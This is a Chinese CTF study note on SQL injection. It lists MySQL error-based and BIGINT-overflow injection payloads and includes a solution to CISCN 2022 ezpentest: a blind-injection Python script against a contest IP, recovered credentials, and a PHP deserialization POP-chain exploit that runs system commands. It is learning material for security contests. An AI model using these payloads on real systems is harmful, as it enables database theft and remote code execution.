### 含gc回收机制

## 常见的sql注入

常见的sql注入或特殊的方法有：

**联合查询**

> **堆叠注入**
>
> **bypass trick**   见 buu - four - [SUCTF 2018]MultiSQL

> **报错注入**
>
> ```mysql
> 1.floor() 
> select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
> 
> 2.extractvalue() 
> select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
> 
> 3.updatexml()
> select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
> 
> 4.geometrycollection()
> select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
> 
> 5.multipoint()
> select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
> 
> 6.polygon() 
> select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
> 
> 7.multipolygon() 
> select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
> 
> 8.linestring() 
> select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
> 
> 9.multilinestring() 
> select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
> 
> 10.exp() 
> select * from test where id=1 and exp(~(select * from(select user())a));
> ```
>
> 

**二次注入**

**基于ascii码的盲注**

**基于时间的盲注**

**过滤(特殊函数，空格，引号等)**

**异或(其实不异或直接比较也一样)**

**mysql8特性(table代替select，新表包含表名和列名)**

**虚拟表绕过登陆**

**二分法快速查表**

**insert注入**

**update注入**

**宽字节注入**

**<font color='pink'>之后做题中遇到了哪种题型就在此稍稍总结下，下面要讲的是完全不常规的注入，到时候全给你们一一解决！！！</font>**

## 特殊(离谱)的sql注入

### 整形数据溢出

#### [CISCN 2022 初赛]ezpentest

以hint形式给出了waf

```php
<?php
function safe($a) {
    $r = preg_replace('/[\s,()#;*~\-]/','',$a);
    $r = preg_replace('/^.*(?=union|binary|regexp|rlike).*$/i','',$r);
    return (string)$r;
  }
?>
```

**username**输入单引号网页会直接报错

有师傅说和**HFCTF中的babysql**很像，等会去找找题

反正核心就是**整形数据溢出**

#### 整形溢出概述

1.sql存储整数的方式

![img](D:\Typora\note\CTF\web\知识点\特殊的sql注入.assets\1540347637.png)

2.只有5.5.5及以上版本的**mysql**才会报溢出错误消息，之下的不会发送任何消息

3.BIGINT 的长度为 8 字节，64 比特。这种数据类型最大的有符号值，用二进制、十六进制和十进制的表示形式分别为:
`0b0111111111111111111111111111111111111111111111111111111111111111`
`0x7fffffffffffffff`
`9223372036854775807`
当对这个值进行某些数值运算时，就会引起`BIGINT value is out of range`，如：
`select 9223372036854775807+1`

![image-20220904104711869](D:\Typora\note\CTF\web\知识点\特殊的sql注入.assets\image-20220904104711869.png)

4.对于无符号整数来说，BIGINT 可以存放的最大值用二进制、十六进制和十进制表示分别为
`0b1111111111111111111111111111111111111111111111111111111111111111`
`0xFFFFFFFFFFFFFFFF`
`18446744073709551615`
同样的，如果对这个值进行数值表达式运算，如加法或减法运算，同样也会导致
`BIGINT value is out of range` 错误:

![image-20220904104835088](D:\Typora\note\CTF\web\知识点\特殊的sql注入.assets\image-20220904104835088.png)

5.对数值0取反，就会得到unsigned的最大BIGINT值

```mysql
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select ~0+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'
```

#### 利用方法

**1.**所以基于BIGINT溢出错误的sql注入的关键点是0，而一个查询如果成功返回，其返回值为`0`
所以我们就可以这样利用(后面带个x是因为你要给转存的数据取个名字)

```mysql
mysql> select (select*from(select user())x);
+-------------------------------+
| (select*from(select user())x) |
+-------------------------------+
| root@localhost                |
+-------------------------------+
1 row in set (0.00 sec)

mysql> select !(select*from(select user())x);
+--------------------------------+
| !(select*from(select user())x) |
+--------------------------------+
|                              1 |
+--------------------------------+
1 row in set (0.00 sec)
mysql> select ~(select * from (select user())x);
+-----------------------------------+
| ~(select * from (select user())x) |
+-----------------------------------+
|              18446744073709551615 |
+-----------------------------------+
1 row in set (0.00 sec)
```

于是我们就可以

```mysql
mysql> select 1+~(select*from(select user())x);
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~((select 'root@localhost' from dual)))'
```

因为版本问题，本地mysql8并未复现成功

**2.**利用这种基于 BIGINT 溢出错误的注入手法，我们可以几乎可以使用 MySQL 中所有的数学函数，因为它们也可以进行取反，具体用法如下所示：

```mysql
mysql> select !atan((select*from(select user())a))-~0;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not(atan((select 'root@localhost' from dual)))) - ~(0))'

mysql> select !ceil((select*from(select user())a))-~0;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not(ceiling((select 'root@localhost' from dual)))) - ~(0))'

mysql> select !floor((select*from(select user())a))-~0;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not(floor((select 'root@localhost' from dual)))) - ~(0))'
```

以下函数同样也可以

```ABAP
HEX
IN
FLOOR
CEIL
RAND
CEILING
TRUNCATE
TAN
SQRT
ROUND
SIGN
EXP
...
```

#### 提取数据

提取数据的方法，跟其他注入攻击手法中的一样：

1. 获取表名：

   ```mysql
   select !(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0;
   ```

2. 取得列名：

   ```mysql
   select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;
   ```

3. 检索数据：

   ```mysql
   select !(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;
   ```

大致介绍到这里，更多详细可以去看参考文章

#### 参考文章

[MySQL 的 BIGINT 报错注入](https://www.tr0y.wang/2018/06/18/MySQL%E7%9A%84BIGINT%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#x04-%E4%B8%80%E6%AC%A1%E6%80%A7%E8%BD%AC%E5%82%A8)

[CISCN2022 Ezpentest Writeup](https://erroratao.github.io/2022/05/30/CISCN2022_Ezpentest/)

#### 回到题目

在本题的waf下构造出来的payload就是

```mysql
0'case'1'when`username`collate'utf8mb4_bin'atelike'{}%'then+9223372036854775807+1+''else'0'||'
```

**1**.因为过滤了空格和其他空白字符，有因为case和then之间必须有空格，所以使用’1’。而且分号内的字符必须为数字且不为0，这样case when才能正常发挥作用

**2.**`cllate'utf8mb4_bin'`是使用utf8mb4_bin字符集，这样才区分大小写，sql默认不区分大小写

**3.**为过滤了rlike和=，所以使用like来进行匹配，{}是占位符，后面脚本里用的

**4.**`then+9223372036854775807+1+''`因为过滤了空格，所以前后两个+是用来连接sql语句的，中间的9223372036854775807+1就是表达式，如果匹配的到的内容符号like里的，就执行并返回这个表达式，从而造成溢出，然后就会报错，浏览器会返回500。就依据这个的不同来进行盲注
也可以使用18446744073709551615+1,18446744073709551615就是~0，但因为~被过滤所以无法使用~0+1

exp

```py
import string

import requests

str=string.ascii_letters+string.digits+"$@!^&}{_%"
payload="0'||case'1'when`username`collate'utf8mb4_bin'like'{}%'then+9223372036854775807+1+''else'0'end||'"
payload1="0'||case'1'when`password`collate'utf8mb4_bin'like'{}%'then+9223372036854775807+1+''else'0'end||'"
url='http://1.14.71.254:28448/login.php'
f=""
while 1:
    for i in str:
        if(i in '%_'): #对%和_进行转义，否则在like里面就是通配符了，%为任意个字符通配符，_为单个字符通配符
            i="\\"+i
        #print(i)
        #resp=requests.post(url=url,data={"username":payload.format(f+i),
                                     #"password":"0"})
        #username = nssctfwabbybaboo!@$%!!
        resp=requests.post(url=url,data={"username":"nssctfwabbybaboo!@$\%!!",
                                     "password":payload1.format(f+i)})
        #password = PAssw40d_Y0u3_Never_Konwn!@!!
        if(resp.status_code==500):
            f+=i
            print(f)
            break

```

读到账号密码后登陆

![image-20220904115749670](D:\Typora\note\CTF\web\知识点\特殊的sql注入.assets\image-20220904115749670.png)

可以知道这个使用phpjiami进行混淆的

用py保存一下内容任何放在[phpjiami_decode](https://github.com/wenshui2008/phpjiami_decode)解密一下(然后发现py保存的死活解密不了，可能还是有点问题，用php保存吧)

```php
<?php
$url ="http://1.14.71.254:28448/login.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt ($ch, CURLOPT_COOKIE, "PHPSESSID=2a57bedf30e06fc5a93c9c409ac76266");
$result = curl_exec($ch);
curl_close($ch);
echo urlencode($result);
file_put_contents("pop.php",$result);
?>
```

解密之后得到

```php
<?php
session_start();
if(!isset($_SESSION['login'])){
    die();
}
function Al($classname){
    include $classname.".php";
}

if(isset($_REQUEST['a'])){
    $c = $_REQUEST['a'];
    $o = unserialize($c);
    if($o === false) {
        die("Error Format");
    }else{
        spl_autoload_register('Al');
        $o = unserialize($c);
        $raw = serialize($o);
        if(preg_match("/Some/i",$raw)){
            throw new Error("Error");
        }
        $o = unserialize($raw);
        var_dump($o);
    }
}else {
    echo file_get_contents("SomeClass.php");
}
 
```

然后访问**1Nd3x_Y0u_N3v3R_Kn0W.php**得到**SomeClass.php**

```php
<?php
class A
{
    public $a;
    public $b;
    public function see()
    {
        $b = $this->b;
        $checker = new ReflectionClass(get_class($b));
        if(basename($checker->getFileName()) != 'SomeClass.php'){
            if(isset($b->a)&&isset($b->b)){
                ($b->a)($b->b."");
            }
        }
    }
}
class B
{
    public $a;
    public $b;
    public function __toString()
    {
        $this->a->see();
        return "1";
    }
}
class C
{
    public $a;
    public $b;
    public function __toString()
    {
        $this->a->read();
        return "lock lock read!";
    }
}
class D
{
    public $a;
    public $b;
    public function read()
    {
        $this->b->learn();
    }
}
class E
{
    public $a;
    public $b;
    public function __invoke()
    {
        $this->a = $this->b." Powered by PHP";
    }
    public function __destruct(){
        //eval($this->a); ??? 吓得我赶紧把后门注释了
        //echo "???";
        die($this->a);
    }
}
class F
{
    public $a;
    public $b;
    public function __call($t1,$t2)
    {
        $s1 = $this->b;
        $s1();
    }
}
?>
```

先看**SomeClass.php**，rce的入口很明显在A了
但是想要进入A需要有一个不是该文件里的类，才能保证该类所在的文件不是`SomeClass.php`
可以用原生类`ArrayObject()`来绕过

接着往下看，B中的**__toStrint**魔术方法调用了**see()**方法
那么现在就是要找到能输出B的函数

在E中的die格外显眼，那么链子就是

`E=>__destruct()->B=>toString()->A=>see()`

接下来看**1Nd3x_Y0u_N3v3R_Kn0W.php**，我们必须要保证在程序报错之前能触发**__destruct()**从而输出rce
` if($o === false)`
这一步就表示我们的反序列化必须是成功的，所以提前销毁不能用**改反序列化类**

`spl_autoload_register('Al');`
这一步调用**AI**方法，include该类名加上**.php**，如果没有就报错，所以这里也需要绕过
我们自创一个**SomeClass**类套一层就好(必须是**SomeClass**哦，不然没这个文件怎么反序列化呢😄)

```php
if(preg_match("/Some/i",$raw)){
            throw new Error("Error");
        }
```

而这里对**Some**进行了过滤，那么我们必须在这步之前要提前触发**__destruct**了，这里就用到了gc回收机制
超详细的介绍可以看[这篇文章](https://www.jb51.net/article/242682.htm)

> 也就是说，我们在这原来的基础上套一个数组
>
> `array(0=$c,1=NULL)`(0,1 变成a,b也行 因为数组是按0,1分辨元素的)(其实不用NULL也可以，因为你修改本身就违反了php)
>
> 然后将最后的**i=0改为1**，此时原来的序列化元素0就指向了NULL，就触发了gc回收机制

**exp**

```php
<?php
class A
{
    public $a;
    public $b;
    public function see()
    {
        $b = $this->b;
        //这里的判断就是b类不能来自于SomeClass.php，所以想要rce就必须要绕过这个判断
        //第一种方法就是用php自带的原生类
        $checker = new ReflectionClass(get_class($b));
        if(basename($checker->getFileName()) != 'SomeClass.php'){
            if(isset($b->a)&&isset($b->b)){
                ($b->a)($b->b."");
            }
        }
    }
}
class B
{
    public $a;
    public $b;
    public function __toString()
    {
        $this->a->see();
        return "1";
    }
}
class C
{
    public $a;
    public $b;
    public function __toString()
    {
        $this->a->read();
        return "lock lock read!";
    }
}
class D
{
    public $a;
    public $b;
    public function read()
    {
        $this->b->learn();
    }
}
class E
{
    public $a;
    public $b;
    public function __invoke()
    {
        $this->a = $this->b." Powered by PHP";
    }
    public function __destruct(){
        //eval($this->a); ??? 吓得我赶紧把后门注释了
        //echo "???";
        die($this->a);
    }
}
class F
{
    public $a;
    public $b;
    public function __call($t1,$t2)
    {
        $s1 = $this->b;
        $s1();
    }
}
class SomeClass{
    public $a;
}
$a=new A();
$arr=new ArrayObject();
$arr->a='system';
$arr->b='ls /';
$a->b=$arr;
$b=new B();
$b->a=$a;
$e=new E();
$e->a=$b;
$c=new SomeClass();
$c->a=$e;
echo (str_replace("i:1;", "i:0;", serialize(array($c,1))));
?>
```

至于为什么是在包含了这个文件之后才报错的，因为前面的反序列化是在这个文件还没包含之前做的，都没定义那些类，哪来的**rce**？？

## 待复现

HUBCTF ezsql
